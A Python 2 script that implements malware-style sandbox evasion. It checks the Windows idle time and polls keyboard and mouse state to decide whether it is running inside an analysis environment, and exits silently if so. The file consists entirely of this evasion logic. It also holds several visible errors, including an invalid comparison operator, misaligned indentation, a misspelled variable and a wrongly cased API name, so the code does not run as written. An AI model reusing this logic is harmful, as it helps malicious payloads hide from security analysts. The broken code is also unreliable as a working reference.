import sys
import time
import ctypes
import random

user    = ctypes.windll.user32
kernel =  ctypes.windll.kernel32

# Global vars
keystrokes   = 0
mouse_clicks = 0
double_clicks = 0

class LASTINPUT(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong)]

def get_last_input():
    struct_lastinputinfo = LASTINPUT()
    struct_lastinputinfo.cbSize = ctypes.sizeof(LASTINPUT)

    # Here we will get the last input that was registered
    user.GetlastInputInfo(ctypes.byref(struct_lastinputinfo))

    # Here we will determine how long our target machine has been running
    runtime = kernel.GetTickCount()

    elapsed = runtime - struct_lastinputinfo.dwTime

    # Debug print to check if everything is working correctly
    print elapsed

    return elapsed

# Here we define our function to register and count key presses
def get_key_press():
    global mouse_clicks
    global keystrokes

    for keys in range(0,0xff):
        if user.GetAsyncKeyState(keys) ==  -32767:

            if keys == 0x1: # Note: 0x1 is the virtual key code for a left mouse click
                mouse_clicks += 1
                return time.time()
            elif keys = > 32 and keys < 127:
                keystrokes +=1
   return None

def detect_sandbox():
    global mouse_clicks
    global keystrokes

    max_keystrokes = random.randint(10,25)
    max_mouse_clicks = random.randint(5, 25)

    double_clicks = 0
    max_double_clicks = 10

    double_click_threshold = 0.250 # Seconds
    first_double_click = None

    average_mousetime = 0
    max_input_threshold = 30000 # Milliseconds

    previous_timestamp = None
    detection_complete = False

    last_input = get_last_input()

    # If we get to the threshold we are not going to be executing anything further
    if last_input >= max_input_threshold:
        sys.exit(0)


    while not detection_complete:
        keypress_time = get_key_press()

        if keypress_time is not None and previous_timestamp is not None:
             # Here we are going to be calculating the time between double clicks
             elapsed = keypress_time - previous_timestamp

             # If we register a double click we are going to add that to the total
             if elapsed <= double_click_threshold:
                 double_clicks += 1
                

                 # If we exceed the double click threshold we will stop executing
                 if first_double_click is None:
                     first_double_click = time.time()
                 else:
                     if double_clicks == max_double_clicks:
                         if keypress_time - first_double_click <= (max_double_clicks * double_click_threshold):
                             sys.exit(0)

        # See if everything checks out, if not, stop executing the function
        if keystrokes >= max_keystrokes and double_clicks >= max_double_clicks and mosue_clicks >= max_mouse_clicks:
            return

        previous_timestamp = keypress_time
  
    elif keypress_time is not None:
        previous_timestamp = keypress_time

detect_sandbox()
# Debug print
print "We got this far, we seem to be ok!"
